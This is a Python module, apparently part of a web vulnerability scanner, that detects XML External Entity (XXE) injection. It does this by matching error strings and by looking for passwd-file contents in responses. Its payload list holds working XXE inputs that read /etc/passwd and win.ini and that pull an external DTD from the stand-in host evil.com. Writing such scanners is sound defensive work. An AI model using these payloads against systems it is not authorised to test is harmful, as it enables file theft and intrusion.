"""XXE (XML External Entity) detection module."""

import logging
from typing import List, Dict, Any
from .base import BaseDetector
from ..utils.models import Vulnerability
from ..utils.constants import VulnerabilityType, Severity


logger = logging.getLogger(__name__)


class XXEDetector(BaseDetector):
    """Detects XML External Entity (XXE) injection vulnerabilities."""
    
    XXE_PAYLOADS = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "http://example.com/evil.dtd">]><r>&c;</r>',
    ]
    
    XXE_ERROR_PATTERNS = [
        'xmlparser',
        'xmlexception',
        'entity',
        'external entity',
        'dtd',
        'documentbuilder',
        'saxparser',
        'xmlstreamreader',
        'xxe',
        'invalid xml',
        'malformed xml',
    ]
    
    def __init__(self):
        """Initialize XXE detector."""
        super().__init__("XXEDetector")
        
    async def detect(
        self, 
        target_url: str, 
        evidence: Dict[str, Any]
    ) -> List[Vulnerability]:
        """Detect XXE vulnerabilities."""
        findings = []
        
        try:
            response_body = evidence.get('response_body', '')
            response_body_lower = response_body.lower()
            response_status = evidence.get('response_status', 0)
            payload_used = evidence.get('payload_used', '')
            injection_point = evidence.get('injection_point', '')
            
            # Check for XXE error messages
            for pattern in self.XXE_ERROR_PATTERNS:
                if pattern in response_body_lower:
                    findings.append(Vulnerability(
                        vulnerability_type=VulnerabilityType.XXE,
                        title='XML External Entity (XXE) Injection',
                        description=f'XXE vulnerability detected: {pattern}',
                        severity=Severity.HIGH,
                        confidence=0.85,
                        url=target_url,
                        parameter=injection_point or 'unknown',
                        payload_used=payload_used,
                        evidence=f'XXE error pattern detected: {pattern}',
                    ))
                    return findings
            
            # Check if payload was XML-based
            if '<?xml' in payload_used or '<!DOCTYPE' in payload_used:
                # Check for successful file inclusion
                file_indicators = ['root:', 'daemon:', 'bin:', '[boot loader]']
                if any(indicator in response_body for indicator in file_indicators):
                    findings.append(Vulnerability(
                        vulnerability_type=VulnerabilityType.XXE,
                        title='XML External Entity (XXE) - File Disclosure',
                        description='XXE payload successfully retrieved local file content',
                        severity=Severity.CRITICAL,
                        confidence=0.95,
                        url=target_url,
                        parameter=injection_point,
                        payload_used=payload_used,
                        evidence='File content retrieved via XXE',
                    ))
                    
        except Exception as e:
            logger.debug(f"XXE detection error: {e}")
            
        return findings
